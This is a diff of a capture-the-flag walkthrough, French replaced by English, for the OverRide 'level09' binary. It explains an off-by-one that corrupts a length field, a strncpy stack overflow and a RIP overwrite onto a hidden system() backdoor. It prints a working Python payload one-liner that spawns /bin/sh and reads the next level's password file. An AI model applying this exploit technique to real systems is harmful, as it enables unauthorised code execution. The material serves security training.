@@ -1,133 +1,202 @@
-# Level09 — Walkthrough (evaluation)
+# Level09 — Walkthrough
 
-## 1. Comportement du programme
+## Overview
 
-- **`main`** affiche un bandeau puis appelle **`handle_msg`**.
-- **`handle_msg`** alloue sur la pile un objet d'environ **0xc0** octets, l'initialise partiellement, enregistre une longueur de copie initiale (**0x8c**), puis enchaine :
-  - **`set_username(&obj)`** : lecture d'une ligne (`fgets`), copie octet par octet dans l'objet a partir de **`obj + 0x8c`**, jusqu'a **`i > 40 (0x28)`** ou octet NUL.
-  - **`set_msg(&obj)`** : lecture d'une seconde ligne, puis **`strncpy(obj, msgbuf, obj->msg_len)`** ou **`msg_len`** est lu a **`obj + 0xb4`**.
-- Le programme se termine normalement apres l'affichage d'un message de fin, sauf si la pile ou le flux de controle sont corrompus.
-
-## 2. Mise en page de l'objet (reconstruction)
-
-L'objet commence a **`rbp - 0xc0`** dans **`handle_msg`** ; la destination de **`strncpy`** est la **base de l'objet** (= debut du champ **`msg`**).
-
-| Offset depuis la base | Taille | Champ |
-|----------------------|--------|--------|
-| **0x00** -- **0x8b** | **0x8c** (140) | **`msg`** |
-| **0x8c** -- **0xb3** | **0x28** (40) | **`username`** |
-| **0xb4** -- **0xb7** | 4 | **`msg_len`** (entier signe 32 bits, lu par `set_msg`) |
-| **0xb8** -- **0xbf** | 8 | **Padding** (alignement / remplissage jusqu'a **0xc0**) |
-
-**Total : 0xc0 octets**, coherent avec **`sub $0xc0, %rsp`**.
-
-## 3. Vulnerabilite (chaine en deux etapes)
-
-1. **Off-by-one logique sur le username** : la boucle autorise **`i <= 0x28`**, soit jusqu'a **41** ecritures dans une zone concue pour **40** octets (`username[0..39]`). Le **41e** octet est donc ecrit **hors** du tableau, sur le **premier octet** du mot **`msg_len`** en **`obj + 0xb4`**.
-2. **Copie controlee par une longueur corrompue** : **`strncpy`** utilise **`msg_len`**. Si celui-ci devient **strictement superieur** a la taille reelle de **`msg`** (**0x8c**), la copie **deborde** dans la suite de l'objet puis, si elle est assez longue, dans les **donnees de cadre** au-dessus de l'objet sur la pile (**saved RBP**, **saved RIP**).
-
-## 4. Pourquoi le 41e octet compte
-
-- **`username`** commence a **`obj + 0x8c`** ; **`msg_len`** commence a **`obj + 0xb4`**.
-- **`0xb4 - 0x8c = 0x28 = 40`** : les indices **`0` a `39`** du username sont valides ; l'indice **`40`** (le **41e** caractere saisi) tombe exactement sur le **debut** de **`msg_len`**.
-- En **little-endian**, ce premier octet est le **LSB** de l'entier : on modifie surtout la **partie basse** de la longueur (ex. **`0x0000008c` -> `0x000000??`** selon l'octet choisi), ce qui change le **nombre d'octets** copies par **`strncpy`** sans toucher aux trois octets de poids fort **tant qu'ils restent nuls**.
-
-## 5. Pourquoi certains tests ne crashent pas et d'autres si
-
-- Si, apres corruption, **`msg_len <= 0x8c`**, **`strncpy`** ne remplit au plus que **`msg`** : pas de debordement vers **`username`**, **`msg_len`**, ni vers la pile au-dela de l'objet -> execution **normale**.
-- Si **`msg_len > 0x8c`**, la copie **continue** au-dela de **`msg`**, reecrit la structure puis peut ecraser **saved RBP** et **saved RIP** ; un **RIP** incoherent provoque en general un **crash** au retour de **`handle_msg`**.
-
-## 6. Offsets exacts (depuis la base de l'objet = debut de `msg`)
-
-| Element | Offset |
-|---------|--------|
-| Debut **`msg`** | **0x00** |
-| Debut **`username`** | **0x8c** |
-| Debut **`msg_len`** | **0xb4** |
-| Fin de l'objet (avant le cadre appelant) | **0xc0** |
-| Debut **saved RBP** (`handle_msg`) | **0xc0** |
-| Debut **saved RIP** | **0xc8** (**0xc0 + 8** en x86-64) |
-
-**`strncpy`** ecrit depuis **offset 0** ; pour atteindre le **saved RIP**, il faut une longueur de copie **> 0xc8** et un contenu source d'au moins **0xc8 + 8** octets.
-
-## 7. Schema memoire (pile, adresses croissantes vers le haut)
-
-```
-        +------------------+
-        |   saved RIP      |  <- rbp + 8   (offset 0xc8 depuis &msg)
-        +------------------+
-        |   saved RBP      |  <- rbp       (offset 0xc0)
-        +------------------+
-        |   padding (8)    |  obj + 0xb8
-        +------------------+
-        |   msg_len (4)    |  obj + 0xb4
-        +------------------+
-        | username (40)    |  obj + 0x8c
-        +------------------+
-        |   msg (0x8c)     |  obj + 0x00  <-- debut strncpy
-        +------------------+
-```
-
-## 8. Conclusion (oral)
-
-Le level09 combine une **erreur de borne** sur la copie du **username** (ecriture du **41e** octet sur le **LSB** de **`msg_len`**) et une **confiance aveugle** dans cette longueur pour **`strncpy`**. Tant que **`msg_len`** reste dans la taille de **`msg`**, rien ne fuit ; des qu'elle **depasse 0x8c**, la copie **traverse** l'objet et peut **corrompre RBP/RIP** a **+0xc0 / +0xc8** depuis le debut de **`msg`**. La correction passerait par une boucle **`i < 40`**, une longueur **bornee** par **`sizeof(msg)`**, et des API sures (**`snprintf` / `memcpy` avec taille fixe**, etc.) sans jamais laisser l'utilisateur piloter une taille arbitraire de copie vers une pile fixe.
+The `level09` binary reads a username and a message, storing them in a stack-allocated structure. An **off-by-one error** in `set_username` lets us overwrite the least significant byte of a length field, which controls how many bytes `strncpy` copies in `set_msg`. This gives us a **stack buffer overflow** that overwrites the saved return address (RIP). A hidden function `secret_backdoor` (which calls `fgets` + `system`) provides a convenient target — no shellcode or ROP chain needed.
 
 ---
 
-## 9. Exploit reproductible
+## Step 1: Run the binary and observe its behavior
 
-### Decouverte cle : `secret_backdoor`
-
-Le binaire contient une fonction **jamais appelee** par le flux normal :
-
-```text
-000000000000088c <secret_backdoor>:
-  fgets(buf, 128, stdin)   -> lit une commande depuis stdin
-  system(buf)              -> l'execute
-  ret
+```
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: hello
+>: Welcome, hello>: Msg @Unix-Dude
+>>: test
+>: Msg sent!
 ```
 
-Elle fait **`fgets` + `system()`** : rediriger **RIP** dessus suffit. Pas besoin de ROP chain ni de shellcode. Il reste a envoyer **`/bin/sh`** comme **troisieme ligne** de stdin (lue par le `fgets` de `secret_backdoor`).
+The program reads a username, then a message, and exits normally.
 
-### Adresse runtime
+---
 
-- Binaire **PIE**, offset `secret_backdoor` = **`0x88c`**
-- Sur la VM OverRide (ASLR desactive), base PIE = **`0x555555554000`**
-- **Adresse runtime** = `0x555555554000 + 0x88c` = **`0x55555555488c`**
-- En little-endian : **`\x8c\x48\x55\x55\x55\x55\x00\x00`**
-- Les deux `\x00` finaux ne posent pas de probleme : `strncpy` copie les **6 octets utiles** (positions 200-205) **avant** de rencontrer le NUL ; les octets hauts du saved RIP sont deja nuls sur la pile.
+## Step 2: Analyze the binary protections
 
-### Payload (3 lignes stdin)
+```
+level09@OverRide:~$ checksec ./level09
+```
 
-| Ligne | Contenu | Taille | Role |
-|-------|---------|--------|------|
-| **1** (username) | `"A" x 40` + `\xff` | 41 | Remplissage + off-by-one : ecrase le **LSB** de `msg_len` -> **255** |
-| **2** (message) | `"A" x 200` + `\x8c\x48\x55\x55\x55\x55` | 206 | **200** octets de padding (couvre `msg` + `username` + `msg_len` + `padding` + `saved RBP`) puis adresse LE de `secret_backdoor` sur le **saved RIP** |
-| **3** (commande) | `/bin/sh` | 7 | Lue par `fgets` dans `secret_backdoor`, passee a `system()` -> **shell** |
+| Protection | Status | Impact |
+|-----------|--------|--------|
+| **Canary** | Disabled | No stack canary — overflow is not detected |
+| **NX** | Enabled | Stack is not executable — no shellcode on stack |
+| **PIE** | Enabled | Binary base address is randomized (but ASLR is off on the VM) |
+| **Partial RELRO** | Yes | GOT is writable but not needed for this exploit |
 
-### Commande finale (one-liner, Python 2 sur la VM)
+---
+
+## Step 3: Reconstruct the object layout
+
+From the disassembly (`Ressources/disassembly.md`), `handle_msg` allocates `0xc0` bytes on the stack:
+
+```asm
+sub $0xc0, %rsp
+```
+
+The structure layout is:
+
+| Offset | Size | Field |
+|--------|------|-------|
+| `0x00` — `0x8b` | 140 bytes | `msg` (destination for `strncpy`) |
+| `0x8c` — `0xb3` | 40 bytes | `username` (copied byte-by-byte) |
+| `0xb4` — `0xb7` | 4 bytes | `msg_len` (controls `strncpy` size) |
+| `0xb8` — `0xbf` | 8 bytes | padding |
+| `0xc0` — `0xc7` | 8 bytes | saved RBP |
+| `0xc8` — `0xcf` | 8 bytes | **saved RIP** (return address) |
+
+---
+
+## Step 4: Identify the vulnerability
+
+### The off-by-one in `set_username`
+
+```asm
+cmpl $0x28, -0x4(%rbp)     ; compare i with 40
+jg   <exit_loop>            ; exit if i > 40
+```
+
+The loop condition is `i <= 0x28` (i.e., `i <= 40`), which means it iterates for `i = 0, 1, ..., 40` — that's **41 iterations**. But `username` only has 40 bytes (indices 0–39). The 41st byte (index 40) is written at `obj + 0x8c + 40 = obj + 0xb4`, which is the **first byte of `msg_len`**.
+
+### Why the 41st byte matters
+
+In little-endian, the first byte of a 32-bit integer is its **least significant byte (LSB)**. The initial value of `msg_len` is `0x8c` (140). If we write `0xff` as the 41st byte of the username, `msg_len` becomes `0x000000ff` = **255**.
+
+### The overflow chain
+
+With `msg_len = 255`, `strncpy(obj, msgbuf, 255)` copies up to 255 bytes starting at `obj + 0x00`. Since the saved RIP is at offset `0xc8` (200 bytes from the start), we can reach and overwrite it with a message of 200+ bytes.
+
+---
+
+## Step 5: Discover `secret_backdoor`
+
+Looking at the disassembly, there is a function never called in the normal flow:
+
+```asm
+000000000000088c <secret_backdoor>:
+    ; fgets(buf, 128, stdin)   → reads a command from stdin
+    ; system(buf)              → executes it
+    ; ret
+```
+
+This function reads a line from stdin and passes it to `system()`. If we redirect RIP here, we just need to send `/bin/sh` as the next line of input to get a shell.
+
+---
+
+## Step 6: Compute the target address
+
+The binary is **PIE** (Position Independent Executable), so the offset of `secret_backdoor` is `0x88c` relative to the binary base.
+
+On the OverRide VM (ASLR disabled), the PIE base is `0x555555554000`:
+
+```
+(gdb) break main
+(gdb) run
+(gdb) info proc mappings
+```
+
+Look for the `level09` line with `r-xp` permissions — the start address is the PIE base.
+
+```
+target = 0x555555554000 + 0x88c = 0x55555555488c
+```
+
+In little-endian: `\x8c\x48\x55\x55\x55\x55\x00\x00`
+
+The two trailing `\x00` bytes are not a problem: `strncpy` copies the 6 useful bytes (positions 200–205) before encountering the NUL, and the high bytes of the saved RIP are already zero on the stack.
+
+---
+
+## Step 7: Build the payload
+
+The exploit sends 3 lines to stdin:
+
+| Line | Content | Size | Purpose |
+|------|---------|------|---------|
+| **1** (username) | `"A" * 40` + `\xff` | 41 bytes | Fill username + off-by-one: overwrites LSB of `msg_len` → 255 |
+| **2** (message) | `"A" * 200` + `\x8c\x48\x55\x55\x55\x55` | 206 bytes | 200 bytes padding (covers `msg` + `username` + `msg_len` + padding + saved RBP) + address of `secret_backdoor` on saved RIP |
+| **3** (command) | `/bin/sh` | 7 bytes | Read by `fgets` inside `secret_backdoor`, passed to `system()` → shell |
+
+### Why 200 bytes of padding?
+
+- `msg` = 140 bytes (0x00–0x8b)
+- `username` = 40 bytes (0x8c–0xb3)
+- `msg_len` = 4 bytes (0xb4–0xb7)
+- padding = 8 bytes (0xb8–0xbf)
+- saved RBP = 8 bytes (0xc0–0xc7)
+- **Total before saved RIP = 200 bytes**
+
+---
+
+## Step 8: Execute the exploit
 
 ```bash
 ( python -c 'import struct,sys;sys.stdout.write("A"*40+"\xff"+"\n"+"A"*200+struct.pack("<Q",0x55555555488c)+"\n"+"/bin/sh\n")' ; cat ) | ./level09
 ```
 
-### Pourquoi ca marche
+### What happens step by step:
 
-1. `set_username` copie **41** octets -> le 41e (`\xff`) ecrase le **LSB** de `msg_len` -> `msg_len = 0xff (255)`
-2. `set_msg` appelle `strncpy(obj, msgbuf, 255)` -> copie **208** octets : **200** de padding puis **8** d'adresse qui ecrasent le **saved RIP**
-3. `handle_msg` execute `leave ; ret` -> **RIP = `0x55555555488c`** -> saute dans `secret_backdoor`
-4. `secret_backdoor` fait `fgets` -> lit **`/bin/sh`** (ligne 3) -> `system("/bin/sh")` -> **shell**
-5. **`; cat`** maintient stdin ouvert pour interagir avec le shell
+1. `set_username` copies 41 bytes → the 41st (`\xff`) overwrites the LSB of `msg_len` → `msg_len = 255`
+2. `set_msg` calls `strncpy(obj, msgbuf, 255)` → copies 206 bytes: 200 padding + 6 bytes of address overwriting saved RIP
+3. `handle_msg` executes `leave ; ret` → RIP = `0x55555555488c` → jumps to `secret_backdoor`
+4. `secret_backdoor` calls `fgets` → reads `/bin/sh` (line 3) → `system("/bin/sh")` → shell
+5. `; cat` keeps stdin open to interact with the shell
 
-### Si la base PIE differe
+---
 
-Sur certaines VM, la base PIE peut varier. Verifier dans GDB :
+## Step 9: Get the flag
 
-```text
-gdb -q ./level09
-break main
-run
-info proc mappings
+```
+$ whoami
+end
+$ cat /home/users/end/.pass
 ```
 
-Chercher la ligne `level09` avec permissions `r-xp` : l'adresse de debut est la **base PIE**. Ajouter **`0x88c`** pour obtenir l'adresse de `secret_backdoor`.
+---
+
+## If the PIE base differs
+
+On some VMs, the PIE base may vary. Check in GDB:
+
+```
+(gdb) break main
+(gdb) run
+(gdb) info proc mappings
+```
+
+Find the `level09` line with `r-xp` permissions. The start address is the PIE base. Add `0x88c` to get the runtime address of `secret_backdoor`.
+
+---
+
+## Final exploit command
+
+```bash
+( python -c 'import struct,sys;sys.stdout.write("A"*40+"\xff"+"\n"+"A"*200+struct.pack("<Q",0x55555555488c)+"\n"+"/bin/sh\n")' ; cat ) | ./level09
+```
+
+---
+
+## Key concepts
+
+| Concept | Role in the exploit |
+|---|---|
+| **Off-by-one error** | The loop condition `i <= 40` writes 41 bytes into a 40-byte buffer, corrupting the adjacent `msg_len` field |
+| **Structure layout** | Understanding the exact offsets between `username`, `msg_len`, and saved RIP is critical for the payload |
+| **Little-endian** | The 41st byte overwrites the LSB of `msg_len`; the 8-byte address must be packed in LE order |
+| **strncpy with corrupted length** | The corrupted `msg_len` (255 instead of 140) allows `strncpy` to overflow past the structure into the stack frame |
+| **Hidden function** | `secret_backdoor` provides `fgets` + `system()` — a convenient target that avoids the need for shellcode or ROP |
+| **PIE binary** | The binary's base address must be known to compute `secret_backdoor`'s runtime address; ASLR off on the VM makes this deterministic |
+| **NX protection** | Stack is not executable, but we don't need shellcode — we redirect to an existing function |
